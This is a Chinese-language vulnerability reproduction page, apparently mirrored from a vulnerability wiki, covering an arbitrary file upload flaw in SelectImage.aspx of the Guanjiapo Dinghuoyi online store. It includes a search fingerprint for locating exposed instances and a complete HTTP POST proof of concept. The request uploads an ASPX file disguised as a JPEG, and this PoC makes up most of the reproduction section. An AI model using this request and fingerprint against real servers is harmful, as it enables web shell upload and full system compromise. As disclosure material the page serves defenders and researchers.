---
title: "任我行 管家婆 订货易在线商城 SelectImage.aspx 任意文件上传漏洞"
date: 2026-10-16 09:10:19
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "任我行-管家婆-订货易在线商城"
tags:
  - "任我行-管家婆-订货易在线商城"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

任我行率先针对中小企业推出了管家婆进销存、财务一体化软件。

管家婆订货易在线商城存在 SelectImage.aspx 任意文件上传漏洞，攻击者可通过该漏洞可控制整个系统，最终导致系统处于极度不安全状态。

## 漏洞影响

管家婆 订货易在线商城

## 网络测绘

```
title="订货易"
```

## 漏洞复现

登陆页面

![image-20231115102159123](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115102159123.png)

poc

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">POST /DialogTemplates/SelectImage.aspx?type=titleimg&amp;size=30*100&amp;pageindex=1&amp;iscallback=true HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=532c7611457d40f4ae4cd9422973416b

--532c7611457d40f4ae4cd9422973416b
Content-Disposition: form-data; name="Filedata"; filename="TEST.aspx"
Content-Type: image/jpeg

&lt;% Response.Write("Test"); %&gt;
--532c7611457d40f4ae4cd9422973416b--"</code></pre>

</details>

![image-20231115102227428](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115102227428-17000150119182.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-SelectImage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
